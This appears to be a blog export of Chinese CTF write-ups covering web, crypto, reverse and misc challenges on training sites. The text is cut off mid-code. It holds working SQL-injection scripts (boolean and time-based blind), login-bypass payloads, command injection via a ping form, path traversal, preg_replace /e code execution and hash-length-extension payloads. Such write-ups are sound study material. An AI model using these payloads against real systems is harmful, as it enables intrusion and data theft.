‘1’=’2 页面无输出。 可以看出这是字符型的sql注入，并且没有过滤and和&#39;，在参数正确的情况下输出Hello，错误的情况下无输出。 可以利用bool型注入，构造payload：?id=1&#39; and ascii(substr((select flag from flag limit 1),1,1))=102 %23 可以显示Hello!，将102改成其他数值就没有返回值。 利用python脚本获得flag。 123456789101112131415161718192021import requests import timeurl = 'http://ctf5.shiyanbar.com/web/index_3.php?id=' def check(payload): url1=url+payload r = requests.get(url1).content #print r return 'Hello' in rflag=''s = r'1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;'for i in xrange(0,32): for c in s: payload = '1\\' and ascii(substr((select flag from flag limit 1),'+str(i)+',1))='+str(ord(c))+' %23' #print payload if check(payload): flag += c break print flag if '&#125;' in flag: break flag:flag{Y0u_@r3_5O_dAmn_90Od} Guess Next Session题目:http://www.shiyanbar.com/ctf/1788 网页上方随机生成的三个随机数，一个输入框，还给出了源码。 1234567891011&lt;?phpsession_start(); if (isset ($_GET['password'])) &#123; if ($_GET['password'] == $_SESSION['password']) die ('Flag: '.$flag); else print '&lt;p&gt;Wrong guess.&lt;/p&gt;';&#125;mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));?&gt; get参数password，与session的参数比较，相等就输出flag。 这题思路猥琐。。。随机数都是骗人的，让两者都为空就行了。 burpsuite抓包，将phpsessid置空，并get参数password为空就行。。 payload:?password= cookie:phpsessid= flag:CTF{Cl3ar_th3_S3ss1on} 程序逻辑问题题目：http://www.shiyanbar.com/ctf/62 查看网页源代码，提示index.txt文件，访问看到源代码。 123456789101112131415161718192021222324252627282930&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; $conn = mysql_connect(\"********\", \"*****\", \"********\"); mysql_select_db(\"phpformysql\") or die(\"Could not select database\"); if ($conn-&gt;connect_error) &#123; die(\"Connection failed: \" . mysql_error($conn)); &#125; $user = $_POST[user];$pass = md5($_POST[pass]);$sql = \"select pw from php where user='$user'\";$query = mysql_query($sql);if (!$query) &#123; printf(\"Error: %s\\n\", mysql_error($conn)); exit();&#125;$row = mysql_fetch_array($query, MYSQL_ASSOC);//echo $row[\"pw\"]; if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123; echo \"&lt;p&gt;Logged in! Key:************** &lt;/p&gt;\";&#125;else &#123; echo(\"&lt;p&gt;Log in failure!&lt;/p&gt;\"); &#125;&#125;?&gt; post参数username passowrd，查询username对应的password，并将输入的password值的md5值与数据库中的password值比较，一样就输出key。 我们输入的password值是可控的，$sql也需要是可控的。 查询语句是select pw from php where user=&#39;$user&#39;，我们可以通过闭合等构造sql语句来让$sql变量可控。 让username=username&#39; union select md5(1)#，查询语句就变成了select pw from php where user=&#39;username&#39; union select md5(1)#&#39;，就达到了目的，让row[pw]变成了1的md5值，再让password=1就可以得到flag。 flag：SimCTF{youhaocongming} 登陆一下好吗??题目：http://www.shiyanbar.com/ctf/1942 思路清奇，手工测试了一下，过滤了or , union , # , select ,* ,/，好像是都被过滤了。没办法看了看writeup。 payload是username=1&#39;=&#39;0&amp;password=1&#39;=&#39;0 猜测sql查询语句是这样的。1$sql = \"select user from flag where user='$_POST['user']' and password='$_POST['password']'\"; 如果按照上面的参数就变成了。1$sql = \"select user from flag where user='1'='0' and password='=1'='0'\"; user=1返回的是0=0,符合条件的，最后就是1$sql = “select user from flag where 1 and 1”; 就可以登陆进去了。 flag：ctf{51d1bf8fb65a8c2406513ee8f52283e7} 让我进去题目：http://www.shiyanbar.com/ctf/1848 先用burpsuite抓包，发现setcookie中有source=0，在cookie中赋值，将其改为1，得到源代码。 12345678910111213141516171819202122232425262728293031$flag = \"XXXXXXXXXXXXXXXXXXXXXXX\";$secret = \"XXXXXXXXXXXXXXX\"; // This secret is 15 characters long for security!$username = $_POST[\"username\"];$password = $_POST[\"password\"];if (!empty($_COOKIE[\"getmein\"])) &#123; if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") &#123; if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) &#123; echo \"Congratulations! You are a registered user.\\n\"; die (\"The flag is \". $flag); &#125; else &#123; die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); &#125; &#125; else &#123; die (\"You are not an admin! LEAVE.\"); &#125;&#125;setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[\"source\"])) &#123; setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE[\"source\"] != 0) &#123; echo \"\"; // This source code is outputted here &#125;&#125; samlpe-hash是15位的secret+adminadmin的md5值，要获得flag，要让cookie中的getmein值等于secret+username+password的md5值，password又不能等于admin，所以要利用哈希扩展攻击，这里直接用的hashpump工具。1hashpump -s 571580b26c65f306376d4f64e53cb5c7 -d admin -k 20 -a admin 输出结果12e18dfd8404515016d3aeeea2aa196909admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00admin 将\\x换成%并填入对应位置。 flag：CTF{cOOkieS_4nd_hAshIng_G0_w3LL_t0g3ther} 因缺思汀的绕过题目：http://www.shiyanbar.com/ctf/1940 查看源代码，在注释中提示我们看source.txt，获得源码。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST['uname']) || !isset($_POST['pwd'])) &#123; echo '&lt;form action=\"\" method=\"post\"&gt;'.\"&lt;br/&gt;\"; echo '&lt;input name=\"uname\" type=\"text\"/&gt;'.\"&lt;br/&gt;\"; echo '&lt;input name=\"pwd\" type=\"text\"/&gt;'.\"&lt;br/&gt;\"; echo '&lt;input type=\"submit\" /&gt;'.\"&lt;br/&gt;\"; echo '&lt;/form&gt;'.\"&lt;br/&gt;\"; echo '&lt;!--source: source.txt--&gt;'.\"&lt;br/&gt;\"; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match(\"/\".$ArrReq.\"/is\",$StrValue)==1)&#123; print \"水可载舟，亦可赛艇！\"; exit(); &#125;&#125;$filter = \"and|select|from|where|union|join|sleep|benchmark|,|\\(|\\)\";foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect(\"XXXXXX\",\"XXXXXX\",\"XXXXXX\");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;$db=\"XXXXXX\";mysql_select_db($db, $con);$sql=\"SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'\";$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print \"CTF&#123;XXXXXX&#125;\"; &#125;else&#123; print \"亦可赛艇！\"; &#125;&#125;else&#123; print \"一颗赛艇！\";&#125;mysql_close($con);?&gt; $filter = “and|select|from|where|union|join|sleep|benchmark|,|(|)“; 经过AttackFilter()函数过滤了这些关键字，所以还有关键字的就不用想了。 要输出flag就要满足mysql_num_rows($query) == 1、$key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]这两个条件。 没啥思路，看了看dalao的writeup。 mysql_num_rows()函数返回结果集中行的数目。我们构造uname让sql语句查询出来的结果是一行就能绕过。Uname = &#39;or 1 limit 1#，这样sql语句就是SELECT * FROM interest WHERE uname = &#39;&#39;or 1 limit 1#，这样就查询1行，也就能绕过第一个条件。 第二个条件是让查询的pwd的值等于输入的值，此处用的是 ==，根据弱类型，NULL和空字符串是相等的，然后就是绕过pwd了，其实就是一个关键字 with rollup 他经常和group by搭配，用来统计。使用了with rollup数据会多一列，显示统计信息，对应的pwd参数是NULL。用OFFSET参数来跳过前面的数据。最后构造的参数就是uname=&#39;or 1 group by pwd with rollup limit 1 OFFSET xx#，xx是猜测的数字。 payload:uname=&#39;or 1 group by pwd with rollup limit 1 OFFSET 2# flag：CTF{with_rollup_interesting} FALSE题目：http://www.shiyanbar.com/ctf/1787 题目给出了登录框，点击view source查看源代码。 123456789101112&lt;?phpif (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else&#123; echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt; get获得参数name和passowrd，要获得flag，就要让两个参数不相等，但是两个参数的sha1()相等。 这里可以运用数组绕过，sha1的参数必须为字符串，如果为其他的类型，则会直接返回FLASE，让两个参数都为数组的形式，就可以FALSE===FALSE，输出flag。 payload:?name[]=1&amp;password[]=2 flag:CTF{t3st_th3_Sha1} Forms题目：http://www.shiyanbar.com/ctf/1819 查看网页源代码。1&lt;input type=\"hidden\" name=\"showsource\" value=0&gt; 将type中的hidden去掉，并赋值value=1，提交，就能看到源代码了。 123456$a = $_POST[\"PIN\"];if ($a == -19827747736161128312837161661727773716166727272616149001823847) &#123; echo \"Congratulations! The flag is $flag\";&#125; else &#123; echo \"User with provided PIN not found.\"; &#125; 让a等于对应的数字，就能得到flag。 flag：ctf{forms_are_easy} 看起来有点难题目：http://www.shiyanbar.com/ctf/2 题目是一个登陆页面，有回显，用admin，admin测试，发现提示登录失败，错误的用户名和密码，当用户名改为其他时，提示数据库连接失败！，猜测是bool型注入。 先查询passowrd的位数，?admin=admin&#39; AND length(password)=8 -- &amp;pass=admin&amp;action=login，password有8位，就可以用python脚本爆破了！ 12345678910111213141516171819202122232425#-*-coding:utf-8-*-import requests import timeurl = 'http://ctf5.shiyanbar.com/basic/inject/index.php?admin=' def check(payload): url1=url+payload a='登陆失败' #print url1 r = requests.get(url1).content #print r return len(r)==775flag=''s = r'1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM@_&#123;&#125;'for i in xrange(1,9): for c in s: payload = 'admin\\' AND substr((password),'+str(i)+',1)=\\''+c+'\\' -- &amp;pass=admin&amp;action=login' #print payload if check(payload): flag += c break print flag 在编码方面卡了一阵，最后用len()求长度解决了。 用admin和爆破出来的密码登陆就是flag。 flag：!@#WwwN5f0cu5coM","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"火种CTF Writeup","date":"2017-07-10T16:00:00.000Z","path":"2017/07/11/火种CTF Writeup/","text":"Crypto解密1\\u606d\\u559c\\u60a8\\uff01\\u006b\\u0065\\u0079\\u007b\\u0074\\u0068\\u0065\\u0020\\u0066\\u0069\\u0072\\u0073\\u0074\\u0020\\u006b\\u0065\\u0079\\u007d Unicode编码，直接解码恭喜您！key{the first key} flag：key{the first key} 解密2Tk5TWFM2M0pPTlJXR1kzR09KVEdPNURCTVZUR0NaM1NOQjJIMj09PQ== 大小写，带等号base64，直接扔到脚本解密。 flag：key{iscccfrfgtaefagrht} 解密4内容：二战时盟军截获德军一段密码，密文为：00000100001000001101000001100001010（密钥：large） 搜索二战时德军密码得到费娜姆密码 将密钥转化为二进制与密文异或即可解密 flag：nihao 解密5我来，我见，我征服 e6Z9i~]8R~U~QHE{RnY{QXg~QnQ{^XVlRXlp^XI5Q6Q6SKY8jUAA 试了一些加密方法，发现是凯撒(可能跟我征服有关吧)。 python脚本1234567891011# -*- coding:utf-8 -*-s='e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA'l=len(s)for i in range(0,128): d='' for j in range(0,l): if(ord(s[j:j+1])+i&gt;128): d=d+chr(ord(s[j:j+1])+i-128) else: d=d+chr(ord(s[j:j+1])+i) print str(i)+\":\"+d 解码得到：a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ== base64解码得到flag。 flag：key{68743000650173230e4a58ee153c68e8} 解密6小明入侵网站后获得了管理员的密文，由于太高兴了手一抖把密文删除了一部分，只剩下前10位d9ddd1800f，小明根据社工知道管理员的密码习惯是4位的数字加字母，你能帮小明恢复密码的哈希值吗？（提示：flag为密码的哈希值） 直接写脚本爆破：123456789101112import hashlibmd5='d9ddd1800f's=r'1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxc'for a in s: for b in s: for c in s: for d in s: st=a+b+c+d mst=hashlib.md5(st).hexdigest() if(mst[0:10]==md5[0:10]): print mst break flag:d9ddd1800fb812bd62e3fc55c35599b0 解密7你猜这是什么东西，记得破解后把其中的密码给我。 00031141:Administrator:s1riu5:C6AE3F7D7534AE05AAD3B435B51404EE:65D4F6EC4BE18E14F3665804EF1E9496（答案为非常规形式） 百度得知是LM-Hash。直接用工具解密得到密码456278 flag：456278 Reverse注册码去哪儿了：提示flag为anyuntec对应的注册码。用ida打开。 反编译sub_401060函数，核心加密过程如下。12345for ( i = 0; i &lt; strlen(&amp;String); ++i ) &#123; if ( *(&amp;v7 + i) != i + *(&amp;String + i) - strlen(&amp;String) ) break; &#125; 发现string储存了对应的用户名，并将每一位减去用户名的长度l，加上对应的位数，就是result。 python脚本如下：12345678string='anyuntec'l=len(string)result=''j=0for i in string: result=result+chr(j+ord(i)-l) j=j+1print result flag:Ygspjqcb 一个简单的PE逆向放入ida，发现众多函数，查找字符串定位函数。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455v26 = 0; v4 = 1; v5 = 4; v6 = 14; v7 = 10; v8 = 5; v9 = 36; v10 = 23; v11 = 42; v12 = 13; v13 = 19; v14 = 28; v15 = 13; v16 = 27; v17 = 39; v18 = 48; v19 = 41; v20 = 42; v21 = 26; v22 = 20; v23 = 59; v24 = 4; v25 = 0; printf(\"please enter flag:\"); sub_411136(); while ( 1 ) &#123; getch(); v1 = sub_411136(); v27[v26] = v1; if ( !v1 || v27[v26] == 13 ) break; if ( v27[v26] == 8 ) &#123; printf(\"\\b\\b\"); sub_411136(); --v26; &#125; else &#123; printf(\"%c\", v27[v26]); sub_411136(); ++v26; &#125; &#125; v3 = 0; for ( i = 0; i &lt; 17; ++i ) &#123; if ( v27[i] != byte_415768[*(&amp;v4 + i)] )//KfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\\0087138 v3 = 1; &#125; if ( v28 != '1' || v29 != '0' || v30 != '2' || v31 != '4' || v32 != '&#125;' ) v3 = 1; v27[v26] = 0; printf(\"\\r\\n\"); 将字符串按照数组v4的数字取出与v27比较，如果相等，则success。 v4数组即最上方连续的一串整形变量，(1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42,26,20,59)，相应的字符串为KfxEeft}f{gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\\0087138，v27最后几位也就是1024}，根据过程编写脚本。 123456flag=''st = 'KfxEeft&#125;f&#123;gyrYgthtyhifsjei53UUrrr_t2cdsef66246087138\\0087138'index = (1,4,14,10,5,36,23,42,13,19,28,13,27,39,48,41,42,26,20,59)for n in range(0,17): flag = flag + st[index[n]-1:index[n]]print flag flag:KEY{e2s6ry3r5s8f61024} Web一道简单的Web题网站显示：your ip is :xxx，类似于实验吧whoareyou运用的是X-Forwarded-For注入。脚本123456789101112131415161718192021#-*-coding:utf-8-*-import requestsimport stringurl=\"http://xxxx\"guess=string.lowercase + string.uppercase + string.digits+'&#123;'+'&#125;'flag=\"\"for i in range(1,100): havetry=0 for str in guess: headers=&#123;\"x-forwarded-for\":\"' +(select case when (substring((select flag from flag ) from %d for 1 )='%s') then sleep(7) else 1 end ) and '1'='1\" %(i,str)&#125; try: res=requests.get(url,headers=headers,timeout=7) except requests.exceptions.ReadTimeout, e: havetry=1 flag = flag + str print \"flag:\", flag break if havetry==0: breakprint 'result:' + flag flag:flag{4c9551d5be5612f7bb5d286785} 猜猜我在哪网站显示../flag.php。 访问robot.txt提示查看index.txt。1234567891011```php&lt;?phpif (empty($_GET[&quot;file&quot;]))&#123; echo(&apos;../flag.php&apos;); return;&#125;else&#123; $filename=&apos;pages/&apos;.(isset($_GET[&quot;file])?$_GET[&quot;file&quot;]:&quot;welcome.txt&quot;).&apos;.html&apos;; include $filename;&#125;?&gt; 文件包含,需要查看flag.php，但是最后有.html,需要%00作为文件的截断。 不知道文件具体位置。只好多../了几次，得到了flag。 payload：?file=../../../../../flag.php%00 flag:flag{31de3cbfdf2884987e65f77ebb5ac338} 前端跑路了QAQ打开index.php还是啥都没有，猜测index.txt，发现index.php的源码。1234567891011121314151617181920212223242526&lt;?php $ip = isset($_POST['ip'])?$_POST['ip']:die();if(!preg_match('/^\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;\\.\\d&#123;1,3&#125;/i',$ip))&#123; die(\"ip 格式错误!\");&#125;echo strlen($ip);if(strlen($ip)&lt;7||strlen($ip)&gt;21)&#123; die(\"ip 长度错误!\");&#125; // Determine OS and execute the ping command.if( stristr( php_uname( 's' ), 'Windows NT' ) ) &#123; // Windows $cmd = shell_exec( 'ping ' .$ip );&#125;else &#123; // *nix $cmd = shell_exec( 'ping -c 1 ' .$ip );&#125; // Feedback for the end userecho \"&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;\"; 判断字符串长度和格式符合ip规则，并执行ping命令，输入ip试试。 post：ip=1.1.1.1 1234567PING 1.1.1.1 (1.1.1.1) 56(84) bytes of data.--- 1.1.1.1 ping statistics ---1 packets transmitted, 0 received, 100% packet loss, time 10000ms 7为字符串长度，后面是命令执行结果，那我们执行以下linux命令试试。 post:ip=1.1.1.1|ls 发现可以执行，并返回了文件名称。 post:ip=1.1.1.1|cat flag.php flag：flag{d73669db24d3a35f74bfccd92741ea20} 小明的密码开头询问用户名，密码，猜测盲注。1234567891011121314151617# -*- coding: utf-8 -*-import requestsurl = 'http://aim.zhugeaq.com:83/'def check(payload): postdata = &#123;'username':'1','password':payload&#125; r = requests.post(url, postdata).content return 'admin_r' in rpassword = 'flag&#123;9's = r'0123456789:abcdefg|~'for t in xrange(33):for i in s: payload = '1\\' or 1 union select 1,2,\\'%s\\' order by 3#' % (password+i) if check(payload): password = password + chr(ord(i)-1) print password break flag:flag{93fcff2af3914f7} 一道很难的Web题打开题目是一个登录界面，用burpsuite抓包，post传入username和pass的参数。 猜测是sql注入。 手工测试过滤了：123456or#--空格%…… 之前看到的文章里有用=的布尔型盲注。构造payload尝试。 username=&#39;=(1)=&#39;1显示用户名错误。 username=&#39;=(0)=&#39;1显示密码错误。 括号里的内容就是bool值，可以供我们查询，直接运用python脚本。123456789101112131415161718# -*- coding: utf-8 -*-import requestsurl = 'http://aim.zhugeaq.com:85/01/login.php'def check(payload): postdata = &#123;'username':payload,'pass':'xx'&#125; r = requests.post(url, postdata).content return '密码错误' in rpassword = ''s = r'0123456789abcdef'for i in xrange(32,0,-1): for c in s: payload = '\\'=(mid((select(pass)from(admin))from(%d))=\\'%s\\')=\\'0' % (i, (c+password)) if check(payload): password = c + password break print password flag:flag{b9b0b759ad3e8a5129044c115e042c59} Misc截获了一个文件解压得到help.xml,内容为a2V5ezIwMTZfa2V5X2hlbHB9==，base64解密。 flag：key{2016_key_help} 这是什么解压的到图片，用十六进制编辑，在文件底部发现&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;，unicode编码，解码得到flag。 flag:key{you are right} 海贼王壁纸下载解压，发现隐藏的Thumbs.db文件，用thumbs_viewer软件打开，得到两张图片的缩略图，找到对应的原图，notepad++打开，在其中一张图片中发现了flag。 flag：key{0123f42483c6cf93635d252cf79bbf0f} 我心永恒解压是我心永恒的mp3文件，用notepad++打开发现了pass:pass_123_word，猜测要用MP3stego，输入对应的pass，得到flag。 flag：key{efrgrh48q4g5gh44q4fhfgg} 找鼹鼠解压的到flag文件，用binwalk分析，发现是ext3的文件。 挂载到linux下读取123456root@2333:~# mount -o loop flag /mnt/root@2333:~# cd /mntroot@2333:/mnt# lsflag.txt lost+foundroot@2333:/mnt# cat flag.txtkey&#123;feb81d3834e2423c9903f4755464060b&#125; flag:key{feb81d3834e2423c9903f4755464060b} 中国菜刀将数据包用binwalk分析，发现一个tar格式的压缩文件，直接binwalk -e解压，得到flag。 flag：key{8769fe393f2b998fa6a11afe2bfcd65e}","tags":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://yoursite.com/tags/WriteUp/"},{"name":"CTF","slug":"CTF","permalink":"http://yoursite.com/tags/CTF/"}]},{"title":"5.2小组赛WriteUp","date":"2017-05-25T16:00:00.000Z","path":"2017/05/26/5.6小组赛WriteUp/","text":"题目地址 Misczip ？？题目带了个？？，猜测是伪加密。用ue打开zip。将09部分改为00，成功解压。flag:congr4tul4tion_thi3_13_fl4g base的n次方123456789101112a = \"flag&#123;&#125;\"for i in range (1,30): b = random.randint(1 , 3) if b ==1: a= base64.b16encode(a) elif b==2: a= base64.b64encode(a) else: a= base64.b32encode(a)s= open(\"flagencode.txt\",\"w\")s.write(a)print \"done!!!\" base64、32、16是随机的，加密了30次，python脚本用try处理报错。12345678910111213import base64a=''s= open(\"flagencode.txt\")a=s.read()for i in range (1,30): try: a=base64.b16decode(a) except: try: a=base64.b32decode(a) except: a=base64.b64decode(a)print(a) flag：B43e_i3_s0_e43y_hiahiahia shark下载pcapng文件，打开，发现http头有一个flag.zip。 提取文件，zip文件被加密了。再去查看http头。http头中有：Authorization: Basic ZmxhZzphenVsY3JlbWE=，base64解密flag:azulcrema，用他解压zip。flag：HTTP_BASIC_AUTH_IS_EASY WebPreg代码审计。12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); require_once(\"flag.php\"); if(!$passwd) &#123; $passwd=$_POST[\"passwd\"]; &#125; if(!$lockedtxt) &#123; $lockedtxt=$_POST[\"lockedtxt\"]; &#125; function flag($var) &#123; echo $var; &#125; if($key) &#123; $unlockedtxt=preg_replace($passwd,$key,$lockedtxt); &#125; if($unlockedtxt===$flag) &#123; flag(\"The Correct: \"); flag($flag); &#125; show_source(\"index.php\"); // key=flag(\\\\1) ?&gt; 搜索preg_replace()漏洞，发现了：http://www.jb51.net/article/38714.htm可以利用函数及修饰符/e执行代码。 最后一行给出key=flag(\\\\1),\\\\1为逆向引用，也就是引用第一个括号的内容，我们要想利用/e执行代码，就要执行flag($flag)来输出。也就是说要让正则括号内容匹配到$flag。 正则表达式+在线正则表达式工具终于匹配到了$flag。 payload:post：passwd=/1(.*)/e&amp;lockedtxt=1$flag flag：pr3g_5wlp8q_Repl4c3 Hashtip：Hash长度扩展攻击。 先看php代码：12345678910111213141516171819202122232425262728&lt;?phperror_reporting(0);$flag = \"xxxxxxxx\";$secret = \"xxxxxxxxxxxxxxxxxxxxxxxxx\"; // This secret is 15 characters long for security!$username = $_POST[\"username\"];$password = $_POST[\"password\"];if (!empty($_COOKIE[\"getmein\"])) &#123; if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") &#123; if ($_COOKIE[\"getmein\"] == md5($secret . urldecode($username . $password))) &#123; echo \"Congratulations! You are a registered user.\\n\"; die (\"The flag is \". $flag); &#125; else &#123; die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); &#125; &#125; else &#123; die (\"You are not an admin! LEAVE.\"); &#125;&#125;setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));echo \"&lt;h1&gt;hello ctfer!&lt;h1&gt;\";?&gt; 发现加密之后的string放在了cookie中，抓包Cookie: sample-hash=be7413992c7e8541aa530688ddbbcc00 我们不知道secret的值，只知道secret+&#39;adminadmin&#39;的md5值，且password不等于admin,判断条件是$_COOKIE[&quot;getmein&quot;] == md5($secret . urldecode($username . $password))，我们需要调整password字符串，并求出对应的md5值，对应的方法就是MD5长度扩展攻击从网上找了一个脚本hash_attack.py 扩展字符串，将得到的MD5用cookie的方式传入payload：12Cookie: getmein=1decc2f82822aeb76decabbe3f864de1post:username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00windylh flag：H4sh_L3ngth_3xt3nsi0n_4tt4cks Codingtips:.git 文件泄露 .git是用git会自己产生的文件，对站点自动部署。 参考:GitHack：一个git泄露利用脚本 github获取GitHack，成功获取index.php的源代码。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php error_reporting(0); include \"flag.php\"; $admin_user = \"pr0_adm1n\"; $admin_pw = clean_hash(\"0e408306536730731920197920342119\"); function clean_hash($hash) &#123; return preg_replace(\"/[^0-9a-f]/\",\"\",$hash); &#125; function myhash($str) &#123; return clean_hash(md5(md5($str) . \"SALT\")); &#125; function create_password($pw_length = 10) &#123; $randpwd = \"\"; for ($i = 0; $i &lt; $pw_length; $i++) &#123; $randpwd .= chr(mt_rand(33, 126)); &#125; return $randpwd; &#125; mt_srand(time());#设置了随机数的时间种子。 $pwd=create_password(); $logged_in = false; if(isset($_POST['user']) &amp;&amp; isset($_POST['password'])) &#123; if($_POST['user'] == $admin_user) &#123; if(myhash($_POST['password']) == $admin_pw)//只要让md5(md5($str) . \"SALT\")的开头为0e &#123; if($pwd==$_POST['pwd']) &#123; $logged_in = true; &#125; &#125; else &#123; echo 'try harder ;)'; &#125; &#125; else &#123; echo 'try harder ;)'; &#125; &#125; if($logged_in) &#123; echo \"&lt;p&gt;$FLAG&lt;/p&gt;\"; &#125;?&gt; 首先考察的是php==的弱类型比较。之后就是爆破随机数部分了。 参考资料：用时间做种子生成随机数 看到了mt_srand(time());利用了时间戳作为mt_rand()生成随机数的种子，那我们可以利用这个时间戳进行爆破。本来打算用python实现,但是不知道mt_srand()的算法，只能再用php了。md5部分：1234567password=''for i in range(60000000,70000000): password=str(i) string=hashlib.md5((hashlib.md5(password)).hexdigest()+'SALT').hexdigest() if string[0:2]=='0e': print password,string break; 得到：60000767 0e681df3aca6388827ada4f30e5a2e7f爆破随机数：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?php $user=\"pr0_adm1n\";$password=\"62778807\"; function create_password($pw_length = 10) &#123; $randpwd = \"\"; for ($i = 0; $i &lt; $pw_length; $i++) &#123; $randpwd .= chr(mt_rand(33, 126)); &#125; return $randpwd; &#125; function send_post($url, $post_data) &#123; $postdata = http_build_query($post_data); $options = array ( 'http' =&gt; array ( 'method' =&gt; 'POST', 'header' =&gt; 'Content-type:application/x-www-form-urlencoded', 'content' =&gt; $postdata, 'timeout' =&gt; 15 * 60 // 超时时间（单位 :s） ) ); $context = stream_context_create($options); $result = file_get_contents($url, false, $context).\"\\n\"; return $result; &#125; for($j=time()-20;$j&lt;time()+20;$j++) &#123; mt_srand($j); $pwd=create_password(); echo \"pwd \".$pwd.\"\\n\"; echo \"user \" .$user.\"\\n\"; echo \"password \".$password.\"\\n\"; $post_data = array( 'user' =&gt; $user, 'password' =&gt; $password, 'pwd'=&gt;$pwd ); $content=send_post('http://192.168.139.241:8080/coding/',$post_data); if(strpos($content,'SKCTF')&gt;-1) &#123; echo $content; &#125; &#125; flag：coding_is_fun Getshell1234567891011121314151617181920&lt;?phpif(isset($_GET) &amp;&amp; !empty($_GET))&#123; $url = $_GET['file']; $path = \"upload/\".$_GET['path'];&#125;else&#123; show_source(__FILE__); exit();&#125;if(strpos($path,'..') &gt; -1)&#123; die('SYCwaf!');&#125;if(strpos($url,'http://127.0.0.1/') === 0)&#123; file_put_contents($path, file_get_contents($url)); echo \"console.log($path update successed!)\";&#125;else&#123; echo \"Hello.Geeker\";&#125;?&gt; Sql1查看源码：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485 &lt;?php include(\"config.php\"); mysql_query(\"set names utf8\"); function randStr($lenth=32)&#123; $strBase = \"1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm\"; $str = \"\"; while($lenth&gt;0)&#123; $str.=substr($strBase,rand(0,strlen($strBase)-1),1); $lenth --; &#125; return $str; &#125; if($install)&#123; $sql = \"create table `user` ( `id` int(10) unsigned NOT NULL PRIMARY KEY AUTO_INCREMENT , `username` varchar(30) NOT NULL, `passwd` varchar(32) NOT NULL, `role` varchar(30) NOT NULL )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci \"; if(mysql_query($sql))&#123; $sql = \"insert into `user`(`username`,`passwd`,`role`) values ('admin','\".md5(randStr()).\"','admin')\"; mysql_query($sql); &#125; &#125; function filter($str)&#123; $filter = \"/ |\\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\\||`|&amp;|\".urldecode('%09').\"|\".urldecode(\"%0a\").\"|\".urldecode(\"%0b\").\"|\".urldecode('%0c').\"|\".urldecode('%0d').\"|\".urldecode('%a0').\"/i\"; if(preg_match($filter,$str))&#123; die(\"you can't input this illegal char!\"); &#125; return $str; &#125; function show($username)&#123; global $conn; $sql = \"select role from `user` where username ='\".$username.\"'\"; $res = mysql_query($sql); if($res)&#123; echo \"$username is ....\"; &#125;else&#123; die(\"Don't have this user!\"); &#125; &#125; function login($username,$passwd)&#123; global $flag; $username = 